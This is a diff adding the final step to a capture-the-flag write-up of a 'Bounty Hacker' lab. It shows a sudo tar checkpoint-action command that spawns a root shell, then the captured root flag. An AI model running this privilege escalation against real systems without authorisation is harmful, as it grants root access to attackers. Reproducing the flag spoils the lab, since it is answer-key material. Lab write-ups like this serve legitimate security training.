@@ -162,6 +162,25 @@ User lin may run the following commands on bountyhacker:
 lin@bountyhacker:~/Desktop$
 ```
 
-Looking at GTFObins documentation, we can see that 
+Looking at GTFObins documentation, we can see that tar can be exploited if user has sudo previleges (on sudo -l)
 
+![[Pasted image 20220819053759.png]]
+
+We can now perform the attack and capture the flag:
+
+```
+$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# cd /root
+# cat root/txt
+cat: root/txt: No such file or directory
+# cat root.txt
+THM{80UN7Y_h4cK3r}
+# 
+
+```
+
+END
 
